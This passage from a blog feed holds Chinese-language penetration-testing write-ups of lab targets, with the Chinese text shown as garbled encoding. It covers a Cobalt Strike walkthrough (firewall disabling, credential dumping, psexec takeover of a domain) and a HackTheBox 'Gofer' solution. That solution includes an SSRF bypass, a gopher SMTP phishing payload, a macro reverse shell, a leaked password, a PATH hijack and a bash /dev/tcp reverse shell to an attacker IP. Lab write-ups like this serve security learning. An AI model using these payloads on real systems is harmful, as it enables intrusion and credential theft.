alt="image-20230809114015844"><br>ËøôÈáåÁî±‰∫éÊòØÈù∂Êú∫ÊâÄ‰ª•ÂøÉË∑≥Êó∂Èó¥ÔºàÂøÉË∑≥Êó∂Èó¥ÊòØÊåá‰∏äÁ∫øÁöÑÊúçÂä°Âô®ÂíåcsÊúçÂä°Âô®ÁöÑÈÄö‰ø°Êó∂Èó¥ÔºâÂç≥ÂõûÊòæÊó∂Èó¥Áõ¥Êé•ËÆæÁΩÆ‰∏∫0<br>ÁÑ∂ÂêéÊâßË°åsysteminfoËé∑Âèñ‰∏Ä‰∏ãÁ≥ªÁªü‰ø°ÊÅØÔºåCSÁöÑshellÊâßË°åwinÁöÑÂëΩ‰ª§Âè™ÈúÄË¶ÅÂú®ÂâçÈù¢Âä†‰∏™shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140271.png" alt="image-20230809114029205"></p><h3 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h3><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140937.png" alt="image-20230809114047888"><br>ÁÑ∂Âêé‰ºöÂàõÂª∫‰∏Ä‰∏™ÁõëÂê¨ÔºåÊèêÊùÉÊñπÂºèÈöè‰æøÈÄâ‰∏™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141658.png" alt="image-20230809114107629"><br>ÁÑ∂ÂêéÂ∞±‰ºöÂèëÁé∞‰∏äÁ∫ø‰∫Ü‰∏ÄÂè∞systemÊùÉÈôêÁöÑ‰∏ªÊú∫<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141714.png" alt="image-20230809114121677"><br>ÁÑ∂ÂêéÁúã‰∏ãCS‰∏äÁöÑÁÇ´ÈÖ∑ÁïåÈù¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141769.png" alt="image-20230809114129723"></p><h3 id="Ê®™ÂêëÁßªÂä®"><a href="#Ê®™ÂêëÁßªÂä®" class="headerlink" title="Ê®™ÂêëÁßªÂä®"></a>Ê®™ÂêëÁßªÂä®</h3><ol><li>È¶ñÂÖàÊü•ÁúãÈò≤ÁÅ´Â¢ôÁä∂ÊÄÅ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall show state</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141622.png" alt="image-20230809114150570"><br>ÂÖ≥Èó≠Èò≤ÁÅ´Â¢ô</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142844.png" alt="image-20230809114221821"><br>2. Â∏∏ËßÑ‰ø°ÊÅØÊî∂ÈõÜ<br>ÂΩìÂâçÂüüÂÜÖËÆ°ÁÆóÊú∫ÂàóË°®Ôºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142196.png" alt="image-20230809114234166"><br>‰∏âÂè∞Êú∫Âô®ÔºåSTU1Â∞±ÊòØwin7ÔºåÂ∞ÜÁõÆÊ†áÂàóÂá∫<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142213.png" alt="image-20230809114246141"><br>ÊäìÂèñwin7ÁöÑÊòéÊñáÂØÜÁ†ÅÔºåÂèØ‰ª•Áõ¥Êé•Âè≥ÈîÆÊäìÂèñÔºå‰πüÂèØ‰ª•ÂëΩ‰ª§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143544.png" alt="image-20230809114315475"><br>ÁÑ∂ÂêéÊü•ÁúãÂØÜÁ†ÅÂá≠ËØÅ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143633.png" alt="image-20230809114332560"><br>ÂüüÊéßÂàóË°®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143676.png" alt="image-20230809114351647"></p><h3 id="ÊîªÂáªÂüüÊéß"><a href="#ÊîªÂáªÂüüÊéß" class="headerlink" title="ÊîªÂáªÂüüÊéß"></a>ÊîªÂáªÂüüÊéß</h3><p>Ê®™ÂêëpsexecÊãø‰∏ãÂüüÊéß<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144915.png" alt="image-20230809114404836"><br>Áî®Êà∑ÂØÜÁ†ÅÈÄâÊã©‰∏äÈù¢ÊãøÂà∞ÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144015.png" alt="image-20230809114417979"><br>ÁõëÂê¨Âô®Êñ∞Âª∫‰∏Ä‰∏™smbÁõëÂê¨Âô®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144067.png" alt="image-20230809114440021"><br>‰ºöËØùÈÄâÊã©‰∏äÈù¢ÁöÑ‰ªªÊÑè‰∏Ä‰∏™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145752.png" alt="image-20230809114502711"><br>ÁÑ∂ÂêéËøêË°åÔºå‰∏çÁü•ÈÅì‰∏∫Âï•ËøôÈáåÊîªÂáªÂ§±Ë¥•‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145966.png" alt="image-20230809114514883"><br>Á∫ØÁ∫ØÊúâÊØíÔºåÂêéÈù¢ÊääÈù∂Êú∫Âç∏‰∫ÜÈáçË£ÖÂèØ‰ª•‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146720.png" alt="image-20230809114538195"><br>ÁÑ∂ÂêéÂêåÊ†∑ÊñπÊ≥ïÊãø‰∏ãÂüüÊàêÂëòÔºåËøôÊ¨°ÁöÑ‰ºöËØùÈÄâÊã©Êñ∞‰∏äÁ∫øÁöÑÂüüÊéß<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145015.png" alt="image-20230809114551973"><br>‰∏äÁ∫øÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146993.png" alt="image-20230809114606935"><br>Ëá≥Ê≠§Êãø‰∏ãÂüüÂÜÖÊâÄÊúâÊú∫Âô®ÔºåÁúãÁúãÊãìÊâëÂõæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146474.png" alt="image-20230809114617416"></p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>Ëøô‰∏™Èù∂Êú∫‰πüÂèØ‰ª•Âà©Áî®ÂÖ∂ÂÆÉÁöÑÊºèÊ¥ûÊãømsfÊù•ÊâìÔºåËøôÈáåÊàë‰∏ªË¶Å‰∏∫‰∫ÜÂ≠¶‰∏ãCSÊâÄ‰ª•ÂÖ®Á®ãÂÜÖÁΩëÁî®CSÊìç‰ΩúÔºåÊÑüËßâÊâìÈù∂Êú∫ÁéØÂ¢ÉÂæàÂ§öÊó∂ÂÄôÊÄªÊòØÂ•áÂ•áÊÄ™ÊÄ™Ôºå‰∏Ä‰ºöÂÑøË°å‰∏Ä‰ºöÂÑø‰∏çË°åÁöÑÔºåÂè¶Â§ñÁúãÈù∂Êú∫‰ªãÁªçÊúâ‰∏™ÁóïËøπÊ∏ÖÁêÜÔºå‰ΩÜÊòØÁúã‰∫ÜÈÇ£‰πàÂ§öwpÂ•ΩÂÉèÊ≤°Êúâ‰∫∫ÂÜô</p>]]></content>
      
      
      <categories>
          
          <category> ÂÜÖÁΩë </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HacktheBox--Gofer</title>
      <link href="/2023/08/HacktheBox-Gofer/"/>
      <url>/2023/08/HacktheBox-Gofer/</url>
      
        <content type="html"><![CDATA[<h2 id="‰ø°ÊÅØÊêúÈõÜ"><a href="#‰ø°ÊÅØÊêúÈõÜ" class="headerlink" title="‰ø°ÊÅØÊêúÈõÜ"></a>‰ø°ÊÅØÊêúÈõÜ</h2><p>nmapÊâ´ÊèèÂºÄÊîæÁ´ØÂè£<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910548.png" alt="image-20230805191023390"><br>ÁÑ∂ÂêéÈÖçÁΩÆetc&#x2F;hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.225 gofer.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄËÆøÈóÆËøô‰∏™ÂüüÂêçÊ≤°Âï•ÂèëÁé∞ÔºåÁÑ∂ÂêéÁî®dirsearchÂÅö‰∫Ü‰∏™ÁõÆÂΩïÊâ´Êèè‰πüÊ≤°ÂèëÁé∞Âï•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910168.png" alt="image-20230805191038098"><br>Ëøô‰∏™assetsÁúã‰∫Ü‰∏ãÊ≤°Âï•‰∏úË•øÂ∞±Â≠òÊîæ‰∫Ü‰∫õÂâçÁ´ØÁöÑ‰∏Ä‰∫õÈùôÊÄÅÊñá‰ª∂ÔºåÂà∞ËøôÈáåÂÆåÂÖ®Ê≤°ÊÄùË∑Ø‰∫ÜÔºåÁåúÊµãÈóÆÈ¢òÂèØËÉΩÂ∞±Âú®‰∏ãÈù¢Ëøô‰∏™ÈÇÆÁÆ±ËøôÈáåÔºå‰ΩÜÊòØ‰∏çÁü•ÈÅìÊÄé‰πàÂà©Áî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910792.png" alt="image-20230805191053738"><br>ÂêéÈù¢Áúã‰∫ÜÂÆåÊï¥ÁöÑËßÜÈ¢ëÊïôÁ®ãÔºåÁ´üÁÑ∂ÊòØÈÄöËøáÈíìÈ±ºÊù•ÂèçÂºπshellÔºåÂπ∂‰∏îÂà©Áî®smbclientËé∑ÂèñÂà∞ÊèêÁ§∫‰πãÂâçÈÉΩ‰∏çÁü•ÈÅìËøô‰∏™ÊñπÊ≥ïÔºåÁ¨¨‰∏ÄÊ¨°Áé©hacktheboxÁöÑÈù∂Êú∫Á°ÆÂÆûÊÉ≥‰∏çÂà∞<br>ÂÖ∂ÂÆûËøôÈáåËøòÊúâ‰∏™Â≠êÂüüÂêç‰ΩÜÊòØdirsearchÊâ´‰∏çÂà∞ÔºåÂ∫îËØ•ÊòØËá™Â∏¶ÈáåÈù¢Ê≤°ÊúâÂ∞±ÊòØ<code>proxy.gofer.htb</code>ÂèØ‰ª•ÈÄöËøáffufÊù•Êâ´ÔºåËøô‰∏™Â∑•ÂÖ∑kaliËá™Â∏¶‰∫ÜÔºå‰ΩÜÊòØÈÇ£‰∏™Â≠óÂÖ∏ÊåáÂÆöÊàëÊ≤°ÊâæÂà∞Ëá™Â∏¶ÁöÑÂ≠óÂÖ∏‰ΩçÁΩÆËøôÈáåÂ∞±‰∏çÊâ´Êèè‰∫ÜÂ§ßÊ¶ÇÂëΩ‰ª§Â¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://gofer.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -H &quot;Host:FUZZ.gofer.htb&quot;</span><br></pre></td></tr></table></figure><p>-wÂêéÈù¢Â∞±ÊòØ‰Ω†Ë¶Å‰ΩøÁî®ÁöÑÂ≠óÂÖ∏ÔºåÁÑ∂ÂêéÊääÈÇ£‰∏™Â≠êÂüüÂêçÂä†Âà∞hosts‰∏ãÂÜçËÆøÈóÆ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911125.png" alt="image-20230805191111085"><br>ÁÑ∂Âêé‰ºöÂèëÁé∞ÈúÄË¶ÅÁôªÂΩï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911663.png" alt="image-20230805191125619"><br>Âº±Âè£‰ª§ËØï‰∫Ü‰∏Ä‰∏ãÊó†ÊûúÔºåÁõ¥Êé•Êäì‰∏™ÂåÖÁúãÁúã‰πüÊ≤°ÂèëÁé∞Âï•ÔºåÁÑ∂ÂêéËøôÈáåÂà©Áî®smbmapÁúã‰∏Ä‰∏ãÂÖ±‰∫´Êñá‰ª∂Âï•ÁöÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H gofer.htb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911946.png" alt="image-20230805191136897"><br>emmmÔºå‰∏çÁü•ÈÅìËøô‰∏™ÁªàÁ´ØÊÄé‰πàËÆæÁΩÆËÉΩËÆ©ÂÆÉ‰∏ÄË°åÂ±ïÁ§∫ÂÆå‰∏çËá™Âä®Êç¢Ë°åÔºåÂèØ‰ª•ÁúãÂà∞Êúâ‰∏™Âè™ËØªÁöÑÂÖ±‰∫´Êñá‰ª∂<br>Âà©Áî®smbclientËøõÂéªÁúã‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N  //gofer.htb/shares</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912926.png" alt="image-20230805191217866"><br>emmmÔºåÊ≤°ÊÄé‰πàÁî®ËøáËøô‰∏™Â∑•ÂÖ∑‰∏çÂ§™ÁÜüÔºåÈáåÈù¢Êúâ‰∏™<code>.backup</code>Êñá‰ª∂Â§πËøõÂéª‰πãÂêéÂèëÁé∞Ëøô‰∏™ÈáåÈù¢Êúâ‰∏™mailÊñá‰ª∂‰∏ãËΩΩ‰∏ãÊù•ÔºåÂõ†‰∏∫ÊàëÊòØÁî®ÁöÑrootÂéª‰ΩøÁî®ÁöÑËøô‰∏™Â∑•ÂÖ∑ÊâÄ‰ª•Ëá™Âä®‰∏ãËΩΩÂà∞‰∫ÜrootÊñá‰ª∂Â§πÔºåÁÑ∂ÂêéÊâìÂºÄmailÊñá‰ª∂ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912727.png" alt="image-20230805191232665"><br>ËøôÂ∞±Áõ∏ÂΩì‰∫é‰∏Ä‰∏™ÊèêÁ§∫‰∫ÜÔºåÂèØ‰ª•Âà©Áî®ÂÆèÈíìÈ±ºÔºå‰ΩÜÊòØËøô‰∏™ÈÇÆÁÆ±ÂèëÈÄÅÂú®ÂÜÖÈÉ®ÊâÄ‰ª•Â∞±ÂæóÊÉ≥ÂäûÊ≥ïÂèëÈÇÆÁÆ±‰∫ÜÔºåËøôÈáåÂà©Áî®ÁÇπÊòØ‰∏äÈù¢ÈÇ£‰∏™Ê≤°ÂèëÁé∞Âï•‰∏úË•øÁöÑÂåÖÔºåÁî®POSTÂèëÂåÖÂπ∂‰∏îÂä†‰∏äindex.php<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912072.png" alt="image-20230805191247091"><br>ÂèØ‰ª•ÁúãÂà∞‰∏çÂÜçÊòØ401‰∫ÜÔºåÂπ∂‰∏îËøôÈáåÊèêÁ§∫Áº∫Â∞ë‰∏™urlÂèÇÊï∞ÔºåÁªôÂÆÉÂä†‰∏äÂπ∂‰∏îÂä†‰∏™Êú¨Âú∞Âú∞ÂùÄ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913595.png" alt="image-20230805191319543"><br>Â≠òÂú®ÈªëÂêçÂçïÔºåÈÇ£‰πàËøôÈáåÂ∫îËØ•Â∞±ÊòØÊúâssrf‰∫ÜÔºåËøô‰∏™ÈªëÂêçÂçïÂèØ‰ª•Áî®ÂçÅÂÖ≠ËøõÂà∂ÁªïËøá</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f000001 </span><br><span class="line"></span><br><span class="line">https://highon.coffee/blog/ssrf-cheat-sheet/  //Ëøô‰∏™Âú∞ÂùÄÊèê‰æõ‰∫Ü‰∏Ä‰∫õÁªïËøáÊñπÊ≥ï</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913551.png" alt="image-20230805191332496"><br>ÁÑ∂ÂêéÂèÇËÄÉ<a href="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2">ÁΩëÂùÄ</a>Âà©Áî®gopherÂçèËÆÆÂú®25Á´ØÂè£ËøõË°åÈÇÆ‰ª∂ÂèëÈÄÅÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://0x7f000001:25/_HELO gofer.htb%0AMAIL FROM: &lt;root@y0n3er.com&gt;%0ARCPT TO: &lt;jhudson@gofer.htb&gt;%0ADATA%0ASubject: &lt;a http://10.10.14.19:7777/bad.odt&gt;SSRF HERE&lt;/a&gt;%0ASSRF AND SMTP%0A.</span><br><span class="line"></span><br><span class="line">urlÁºñÁ†ÅÔºö</span><br><span class="line">gopher://0x7f000001:25/_HELO%20gofer.htb%250AMAIL%20FROM:%20%3Croot@y0n3er.com%3E%250ARCPT%20TO:%20%3Cjhudson@gofer.htb%3E%250ADATA%250ASubject:%20%3Ca%20http://10.10.14.19:7777/bad.odt%3ESSRF%20HERE%3C/a%3E%250ASSRF%20AND%20SMTP%250A.</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™payloadÂ∞±ÊòØÂêëJocelyn HudsonÁî®Êà∑Âèë‰∫Ü‰∏Ä‰∏™ÈÇÆ‰ª∂ÈÄâÊã©Ëøô‰∏™Áî®Êà∑ÊòØÂõ†‰∏∫ÂâçÈù¢ÁöÑÈÇÆ‰ª∂ÊèêÁ§∫Â•πÁà±ÁÇπ‰∏çÊòéÈÇÆ‰ª∂ÔºåËøô‰∏™ÈáåÈù¢Êúâ‰∏Ä‰∏™ÊåáÂêëÊîªÂáªÊú∫ÁöÑË∂ÖÈìæÊé•ÔºåÁÑ∂ÂêéÂà©Áî®Â∑•ÂÖ∑LibreofficeÂÖàÈöè‰æøÂà∂‰Ωú‰∏Ä‰∏™<code>bad.odt</code>Êñá‰ª∂ÔºåÁîüÊàê‰∏Ä‰∏™ÊñáÊú¨ÊñáÊ°£Âç≥‰∏∫odtÊ†ºÂºèÔºåÁÑ∂ÂêéÁî®pythonËµ∑‰∏™ÊúçÂä°ÂÜçÂèëÈÄÅÈÇÆ‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913514.png" alt="image-20230805191353429"><br>ÂèØ‰ª•ÁúãÂà∞Èù∂Êú∫ÂêéÂè∞Â∞±ÁÇπ‰∫ÜËøô‰∏™ÈÇÆ‰ª∂</p><h2 id="ÂèçÂºπshell-ÂÆèÈíìÈ±º"><a href="#ÂèçÂºπshell-ÂÆèÈíìÈ±º" class="headerlink" title="ÂèçÂºπshell (ÂÆèÈíìÈ±º)"></a>ÂèçÂºπshell (ÂÆèÈíìÈ±º)</h2><p>ÈÇ£‰πàÁé∞Âú®Â∞±ÂèØ‰ª•Âä†‰∏™ÂÆèÊù•ÂèçÂºπshell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914755.png" alt="image-20230805191407695"><br>ÁÑ∂ÂêéÂú®‰Ω†ÂáÜÂ§áÁöÑ<code>bad.odt</code>Âä†‰∏™ÂèçÂºπshellÁöÑÂÆè<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914057.png" alt="image-20230805191418015"><br>‰øùÂ≠ò‰πãÂêéËøòË¶ÅÂä†‰∏™ÊâìÂºÄÊñá‰ª∂ËøêË°åÂÆèÁöÑËÆæÁΩÆ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914258.png" alt="image-20230805191427211"><br>ÁÑ∂ÂêéÂÜçËµ∑ÊúçÂä°ÂèëÈÇÆ‰ª∂ÔºåÁ®çÁ≠â‰∏Ä‰∏ãÊãøÂà∞shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914991.png" alt="image-20230805191435903"><br>ËøôÈáåÊú¨Êù•ÊÉ≥Âà©Áî®pythonÂºÑ‰∏™‰∫§‰∫íÂºèshellÂèëÁé∞‰∏çË°åÔºåÁÑ∂ÂêéÂéªjhudsonÁõÆÂΩï‰∏ãÊâìÂºÄuser.txtÊãøÂà∞userÁöÑflag</p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>È¶ñÂÖàÂ∞±ÊòØÁî®[pspy64](<a href="https://github.com/DominicBreuker/pspy">DominicBreuker&#x2F;pspy: Monitor linux processes without root permissions (github.com)</a>)Ëøô‰∏™ËÑöÊú¨ÂéªÁõëÂê¨ÂêéÂè∞‰∏çÂêåÁî®Êà∑ÊâßË°åÁöÑÂëΩ‰ª§ÔºåÂÖà‰∏ä‰º†Âà∞Èù∂Êú∫‰∏ä<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914461.png" alt="image-20230805191455314"><br>ÁªôÂÆÉËøêË°åÊùÉÈôêÔºåÁÑ∂ÂêéÂéªËøêË°åÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915157.png"><br>ÂèëÁé∞Ê≥ÑÈú≤‰∫ÜÁî®Êà∑tbuckleyÁöÑsshÂØÜÁ†Å<code>tbuckley:ooP4dietie3o_hquaeti</code>Áôª‰∏äÂéªÁúãÁúã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tbuckley@gofer.htb</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂ≠òÂú®‰∏§‰∏™Áî®Êà∑ÁªÑÔºåÊâæ‰∏Ä‰∏ãÂ±û‰∫éÁ¨¨‰∫å‰∏™ÁªÑÁöÑÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915974.png" alt="image-20230805191523914"><br>ÊâæÂà∞‰∫Ü‰∏Ä‰∏™notesÊñá‰ª∂Â±û‰∫éroot‰ΩÜÊòØdevÂÖ∑ÊúâÊâßË°åÊùÉÈôêÔºåÊâßË°å‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915306.png" alt="image-20230805191534230"><br>Âü∫Êú¨ÂäüËÉΩÂ∞±ÊòØÂÜôÁ¨îËÆ∞Âï•ÁöÑÔºåÊääËøô‰∏™‰∫åËøõÂà∂Á®ãÂ∫è‰∏ã‰∏ãÊù•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915662.png" alt="image-20230805191545504"><br>ÁÑ∂ÂêéÂà©Áî®idaÊàñËÄÖÂú®Á∫øÁΩëÁ´ôÁªôÂÆÉÈÄÜÂêë‰∏Ä‰∏ãÁúãÁúã‰ª£Á†ÅÔºåcase1ËøôÈáå‰ºöÂàÜÈÖç40‰∏™Â≠óËäÇÁöÑÂÜÖÂ≠òÔºåÁÑ∂ÂêéÈÄöËøáuidÂà§Êñ≠Áî®Êà∑ÁöÑÊùÉÈôêÊâßË°å‰∏çÂêåÁöÑÊìç‰Ωú<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915693.png" alt="image-20230805191558648"><br>ÁÑ∂ÂêéÊòØcase3ËøôÈáåÂ¶ÇÊûúÂàõÂª∫‰∫ÜÁî®Êà∑ÊâßË°åËøô‰∏™Êìç‰ΩúÂ∞±‰ºöÂ∞Üvar_10_1ÁöÑÂÜÖÂ≠òÈáäÊîæÊéâÔºå‰ΩÜÊòØËøô‰∏™ÊåáÈíàÊ≤°ÊúâÊ∏Ö0ÊàñËÄÖËÆæÁΩÆ‰∏∫nullËøôÂ∞±ÊòØÈÄ†ÊàêÊºèÊ¥ûÁöÑÂú∞Êñπ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916081.png" alt="image-20230805191608034"><br>ÂÜçÂ∞±ÊòØcase4ËøôÈáåÔºåÂÆÉËøôÈáåÂàÜÈÖçÁöÑÂÜÖÂ≠òÂÖ∂ÂÆûÂ∞±ÊòØ‰∏äÈù¢ÈáäÊîæÊéâÁöÑÔºåÁî±‰∫éÊåáÈíàÊ≤°ÊúâÁΩÆ0ËøôÈáåÂ∞±‰ºöÈÄ†ÊàêÂÜÖÂ≠òË¶ÜÁõñÁöÑÈóÆÈ¢òÊãøÂà∞admin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916397.png" alt="image-20230805191617355"><br>ÁÑ∂ÂêéÂà∞case8ËøôÈáåËøõË°åÂëΩ‰ª§ÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916255.png" alt="image-20230805191629202"><br>Âú®ÊâßË°åtarÁöÑÊó∂ÂÄôÂÆÉ‰ºö‰ªéÁéØÂ¢ÉÂèòÈáèÈáåÈù¢ËøõË°åÊü•ËØ¢ÔºåÊü•Âà∞ÁöÑÁ¨¨‰∏Ä‰∏™tarÂ∞±‰ºöÂÅúÊ≠¢Êü•ËØ¢ÁÑ∂ÂêéÊâßË°åÊü•Âà∞ÁöÑtarÈÇ£‰πàÂ∞±ÂèØ‰ª•Âú®ÁéØÂ¢ÉÂèòÈáèËøôÈáåËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºåÂÖàÂú®ÂΩìÂâçÁõÆÂΩïÂàõÂª∫‰∏™tmpÁõÆÂΩïÈáåÈù¢ÂÜçÂàõÂª∫‰∏™tarÊñá‰ª∂ÔºåtarÊñá‰ª∂ÈáåÈù¢ÂÜôÂÖ•ÂèçÂºπshellÁöÑÂëΩ‰ª§ÔºåÁÑ∂ÂêéÂ∞ÜÂê´tarÊñá‰ª∂ÁöÑÁõÆÂΩïÊ∑ªÂä†Âà∞ÁéØÂ¢ÉÂèòÈáèÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916350.png" alt="image-20230805191641284"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.82/6666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>ÁéØÂ¢ÉÂèòÈáèËøôÈáåÂºÑÂÆå‰πãÂêéÂ∞±ÂèØ‰ª•ÂéªËøêË°ånotes‰∫ÜÔºåÈ¶ñÂÖàÈöè‰æøÂàõÂª∫‰∏™Áî®Êà∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051916708.png" alt="image-20230805191654656"><br>ÁÑ∂ÂêéÂà†Èô§Áî®Êà∑ÔºåÂÜçÂÜôÂÖ•Á¨îËÆ∞ÔºåÁ¨îËÆ∞ÂÜÖÂÆπÂâç24‰∏™Â≠óÁ¨¶Èöè‰æøÔºåÂêéÈù¢‰∏∫admin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917185.png" alt="image-20230805191707123"><br>ÁÑ∂ÂêéÊâßË°å8Â§á‰ªΩÂç≥ÂèØÊãøÂà∞shellÊèêÊùÉÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051917506.png" alt="image-20230805191733466"></p><h2 id="ÊâìÂÆåÊÑüÊÇü"><a href="#ÊâìÂÆåÊÑüÊÇü" class="headerlink" 